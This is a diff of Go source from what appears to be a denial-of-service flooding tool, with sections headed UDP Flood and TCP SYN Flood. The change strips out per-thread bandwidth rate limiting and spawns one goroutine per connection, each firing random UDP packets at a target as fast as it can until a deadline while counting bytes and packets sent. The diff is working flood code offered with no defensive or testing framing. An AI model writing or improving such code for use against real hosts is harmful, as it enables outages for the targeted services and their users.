@@ -50,6 +50,24 @@ func statsLoop() {
 }
 
 // ==================== UDP Flood ====================
+func udpWorker(c *net.UDPConn, packet []byte, deadline time.Time, stopCh chan bool) {
+	for {
+		select {
+		case <-stopCh:
+			return
+		default:
+		}
+		if time.Now().After(deadline) {
+			return
+		}
+		n, err := c.Write(packet)
+		if err == nil {
+			atomic.AddInt64(&statBytes, int64(n))
+			atomic.AddInt64(&statPPS, 1)
+		}
+	}
+}
+
 func udpFlood(target string, port int, concurrency int, bandwidth int, packetSize int, duration time.Duration, stopCh chan bool, wg *sync.WaitGroup) {
 	defer wg.Done()
 	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
@@ -58,57 +76,23 @@ func udpFlood(target string, port int, concurrency int, bandwidth int, packetSiz
 	}
 	packet := make([]byte, packetSize)
 	rand.Read(packet)
-	rateLimit := bandwidth > 0
-	var sleepDur time.Duration
-	if rateLimit {
-		// 每线程限速
-		sleepDur = time.Duration(packetSize*8) * time.Second / time.Duration(bandwidth*1000*1000/concurrency)
-	}
 	deadline := time.Now().Add(duration)
-	conns := make([]*net.UDPConn, concurrency)
+	var wg2 sync.WaitGroup
 	for i := 0; i < concurrency; i++ {
 		c, err := net.DialUDP("udp", nil, addr)
 		if err != nil {
 			continue
 		}
 		c.SetWriteBuffer(1 << 20)
-		conns[i] = c
+		wg2.Add(1)
+		go func(conn *net.UDPConn) {
+			defer wg2.Done()
+			defer conn.Close()
+			udpWorker(conn, packet, deadline, stopCh)
+		}(c)
 	}
-	atomic.AddInt64(&statConns, int64(len(conns)))
-	for {
-		select {
-		case <-stopCh:
-			for _, c := range conns {
-				if c != nil {
-					c.Close()
-				}
-			}
-			return
-		default:
-		}
-		if time.Now().After(deadline) {
-			for _, c := range conns {
-				if c != nil {
-					c.Close()
-				}
-			}
-			return
-		}
-		for i := 0; i < concurrency; i++ {
-			c := conns[i]
-			if c == nil {
-				continue
-			}
-			n, err := c.Write(packet)
-			if err == nil {
-				atomic.AddInt64(&statBytes, int64(n))
-				atomic.AddInt64(&statPPS, 1)
-			}
-			if rateLimit && sleepDur > 0 {
-				time.Sleep(sleepDur)
-			}
-		}
-	}
+	atomic.AddInt64(&statConns, int64(concurrency))
+	wg2.Wait()
 }
 
 // ==================== TCP SYN Flood（raw socket） ====================
